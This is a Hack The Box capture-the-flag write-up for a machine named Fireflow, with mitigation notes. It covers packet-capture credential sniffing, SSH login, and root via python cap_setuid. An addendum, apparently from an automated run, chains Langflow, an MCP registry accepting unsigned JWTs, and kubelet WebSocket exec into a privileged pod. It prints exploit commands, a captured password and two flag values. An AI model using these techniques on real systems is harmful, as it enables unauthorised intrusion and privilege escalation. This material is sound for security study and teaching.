# HTB: Fireflow

| Info | Detail |
|------|--------|
| OS | Linux (Ubuntu, OpenSSH 8.2p1 Ubuntu 4ubuntu0.2) |
| Difficulty | Easy |
| IP | 10.129.86.147 → 10.129.86.228 (box reset mid-engagement) |
| Date | 2026-08-13 |
| Status | ✅ Rooted |

> The web app self-identifies as "Security Dashboard" — the HTB machine name is **Fireflow**.

## Attack Chain

```
Web recon → "Security Dashboard" (Gunicorn) on :80
→ /capture endpoint runs a server-side 5s tcpdump of ALL host traffic
→ repeatedly trigger /capture, download resulting .pcap via /download/<n>
→ pcap catches the box's own internal plaintext FTP login (nathan)
→ SSH as nathan → user flag
→ getcap: cap_setuid on /usr/bin/python3.8
→ python3.8 os.setuid(0) → root flag
```

---

## Reconnaissance

### Port Scan

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn ("Security Dashboard")
```

### Web Enumeration

The site is a network "Security Dashboard" exposing live host telemetry:

- `/` — dashboard home
- `/ip` — renders live `ifconfig` output from the target
- `/netstat` — renders live `netstat` output from the target
- `/capture` — triggers a live **5-second server-side `tcpdump` capture**, redirects to `/data/<n>`
- `/data/<n>` — HTML analysis of capture `<n>` (packet counts by protocol)
- `/download/<n>` — raw `.pcap` file for capture `<n>`

Gobuster (`common.txt`) surfaced nothing beyond the above. FTP anonymous login denied (530).

---

## Foothold — Packet-Capture Credential Leak

The `/capture` endpoint's `tcpdump` snapshot records **all traffic on the box's interface** during its 5-second window — not just the requesting client's own traffic. Anything else on the host that talks to another service during that window is captured too.

**Approach**: repeatedly trigger `/capture` (flooding the box with concurrent HTTP requests to widen the odds of catching interesting traffic in the 5s window), then pull each resulting `.pcap` via `/download/<n>` and inspect it:

```bash
tcpdump -r capture_0.pcap -A
```

`download/0` caught a **plaintext FTP login performed by the box itself** — an internal monitoring/health-check process periodically authenticating to its own FTP server:

```
USER nathan
PASS Buck3tH4TF0RM3!
230 Login successful.
```

The "security dashboard" ironically leaks its own service credentials to any user who can trigger enough captures.

---

## User

The captured credentials worked directly over SSH:

```bash
ssh nathan@10.129.86.228   # Buck3tH4TF0RM3!
```

**User flag**: `63a9a3c842f0c1e7094ef2642bcd2f38`

---

## Privilege Escalation — `cap_setuid` on Python

Capability audit revealed a `setuid`-capable interpreter:

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` on an interpreter is equivalent to full root — the [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) capability technique:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("id; cat /root/root.txt")'
# uid=0(root) gid=1001(nathan) ...
```

**Root flag**: `d6e389c6c155ebb52d8f7f78b4638ec0`

---

## Notes

- Box IP reset once mid-engagement (`.147` → `.228`). Re-ran recon from scratch on the new instance rather than assuming carried state — the FTP vuln/creds were consistent but had to be re-discovered.
- `/download/<n>` had no path traversal (`../` and URL-encoded variants both 404).
- No command injection on `/capture` query params (`filter`, `bpf`, `iface` — all just incremented the capture number with no behavioral difference).

## Lessons Learned / Mitigation

- **Never use cleartext FTP for internal service-to-service auth**, even for monitoring — use key-based auth or FTPS/SFTP. A monitoring process logging into plaintext FTP on a loop is the entire kill chain here.
- **A user-exposed packet-capture feature must be scoped to the requesting user's own traffic**, not the whole host interface — otherwise it's a network-wide credential sniffer as-a-service.
- **Audit binary capabilities** (`getcap -r /`) as standard hardening — `cap_setuid` on an interpreter is equivalent to passwordless sudo-to-root for anyone who can execute it.

---

# Addendum: Fireflow Langflow / MCP / Kubernetes Chain

> Added from ARES run on 2026-08-14. This appears to be a different Fireflow
> instance/profile than the older `tcpdump`/FTP/capability path above: the
> external surface here exposed only SSH and HTTPS, with Langflow behind a
> wildcard TLS vhost.

| Info | Detail |
|------|--------|
| OS | Linux / Ubuntu 24.04-era host with k3s workloads |
| External IP | `10.129.244.214` |
| Date | 2026-08-14 |
| Status | ✅ Rooted |
| Initial surface | `22/tcp` SSH, `443/tcp` HTTPS |

## Attack Chain — Langflow to Kubernetes Host Mount

```text
HTTPS recon
→ wildcard cert reveals fireflow.htb / *.fireflow.htb
→ fireflow.htb landing page links to flow.fireflow.htb public playground
→ flow.fireflow.htb runs Langflow 1.8.2
→ public flow exposes app/MCP context and leads to nightfall SSH credential reuse
→ SSH as nightfall
→ ~/.mcp/config.json exposes internal MCP registry on :30080
→ MCP registry accepts JWT alg:none admin token
→ register/call controlled MCP tool as mcp container user
→ read mcp pod Kubernetes service-account token
→ kubelet /pods enumeration exposes privileged node-exporter pod
→ kubelet WebSocket exec into node-exporter
→ node-exporter runs uid 0 with host root mounted read-only at /host/root
→ read /host/root/root/root.txt
```

## Reconnaissance

### Port Scan

```text
nmap -p- --min-rate 5000 -Pn -oA nmap/allports 10.129.244.214
nmap -sC -sV -p22,443 -Pn -oA nmap/tcp-svc 10.129.244.214
```

Observed open ports:

```text
22/tcp  open  ssh    OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
443/tcp open  https  nginx
```

The TLS certificate was self-signed with:

```text
CN:  fireflow.htb
SAN: fireflow.htb, *.fireflow.htb
```

Add the vhosts locally:

```text
10.129.244.214 fireflow.htb flow.fireflow.htb
```

`curl` was more reliable with TLS 1.2 forced:

```bash
curl -sk --tls-max 1.2 https://flow.fireflow.htb/api/v1/version
```

Version evidence:

```json
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

### Public Langflow Exposure

The landing page on `fireflow.htb` leaked a public playground UUID:

```text
/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

The public flow metadata was accessible unauthenticated:

```text
GET /api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25
```

Other useful unauthenticated endpoints:

```text
/api/v1/version
/api/v1/config
/api/v1/flows/basic_examples/
/openapi.json
```

Protected endpoints behaved as expected:

```text
/api/v1/users/whoami  -> 403 No authentication credentials provided
/api/v1/flows/        -> 403 No authentication credentials provided
/api/v1/run/<uuid>    -> 403 API key required
/api/v1/auto_login    -> 403 auto-login disabled
```

## Foothold — Nightfall SSH

The Langflow/MCP path led to valid SSH credentials for the `nightfall` user
(credential intentionally omitted here):

```bash
ssh nightfall@10.129.244.214
id
# uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
```

This SSH server was finicky from the VPN path. The stable options were:

```bash
ssh \
  -o KexAlgorithms=curve25519-sha256 \
  -o Ciphers=aes128-ctr \
  -o MACs=hmac-sha2-256 \
  -o IPQoS=none \
  nightfall@10.129.244.214
```

`sudo -l` was not useful:

```text
Sorry, user nightfall may not run sudo on fireflow.
```

## Internal MCP Registry

`nightfall` had an MCP configuration in `~/.mcp/config.json` pointing to an
internal registry on port `30080`.

The registry identified itself as an MCP tool registry and exposed JWT-backed
admin functionality. Its accepted algorithms included `HS256` and `none`, so an
unsigned admin-style JWT was accepted.

Impact:

```text
POST /api/v1/tools       # admin-gated tool registration
POST /mcp                # JSON-RPC tool call
```

After registering a controlled command tool, code execution landed inside the
MCP pod:

```text
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
hostname: mcp-server-54464cb475-29ztf
```

The MCP pod had a projected Kubernetes service-account token:

```text
/var/run/secrets/kubernetes.io/serviceaccount/token
```

## Kubernetes / Kubelet Enumeration

From the MCP execution context, the kubelet endpoint was reachable at:

```text
https://10.42.1.1:10250
```

The `mcp-sa` token could read kubelet pod metadata:

```bash
curl -sk -H "Authorization: Bearer <mcp-sa-token>" \
  https://10.42.1.1:10250/pods
```

The key workload was node-exporter:

```text
namespace: monitoring
pod:       prometheus-prometheus-node-exporter-nmntq
container: node-exporter
image:     quay.io/prometheus/node-exporter:v1.11.1
```

Important pod security/mount evidence:

```text
securityContext:
  privileged: true
  runAsUser: 0
  runAsNonRoot: false
  readOnlyRootFilesystem: false
  allowPrivilegeEscalation: true

volumeMounts:
  /host/proc  -> host /proc, read-only
  /host/sys   -> host /sys, read-only
  /host/root  -> host /, read-only, HostToContainer
```

Simple curl attempts to `/run` or non-upgraded `/exec` were misleading:

```text
GET /exec/...     -> Upgrade request required
POST /exec/...    -> 403 nodes/proxy denied
POST /run/...     -> 403 nodes/proxy denied
```

The successful path was a raw WebSocket upgrade to kubelet `/exec` using the
older kubelet query parameter names `input`/`output` rather than
`stdin`/`stdout`/`stderr`:

```text
GET /exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter
    ?command=/bin/sh
    &command=-c
    &command=id
    &container=node-exporter
    &input=0
    &output=1
    &tty=0

Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Protocol: v4.channel.k8s.io
Authorization: Bearer <mcp-sa-token>
```

Successful exec evidence:

```text
HTTP/1.1 101 Switching Protocols
Sec-WebSocket-Protocol: v4.channel.k8s.io

uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
hostname: fireflow
```

## Root Flag

Because the node-exporter container had host `/` mounted at `/host/root`, the
host root flag was readable at:

```text
/host/root/root/root.txt
```

Flag value is intentionally redacted in this public draft. The verified local
capture showed a 33-byte flag matching HTB format.

## Lessons Learned / Mitigation — Langflow/MCP/Kubernetes Chain

- Do not expose public Langflow flows with sensitive tool/config context unless
  the execution and metadata boundaries are fully understood.
- Reject `alg:none` JWTs. Never let a token header choose an insecure signing
  mode.
- Treat internal MCP/tool registries as code-execution surfaces; admin actions
  must require strong authentication and authorization.
- Kubernetes service-account tokens should have the minimum RBAC needed. Even
  read-only kubelet metadata can reveal privileged workloads and host mounts.
- Privileged monitoring pods with host root mounts are high-risk. If required,
  keep them non-exec-able by untrusted identities and avoid broad host mounts.
- For kubelet debugging, distinguish HTTP method authorization failures from
  WebSocket upgrade requirements; `/exec` behavior can differ between plain
  curl probes and a real upgraded stream.
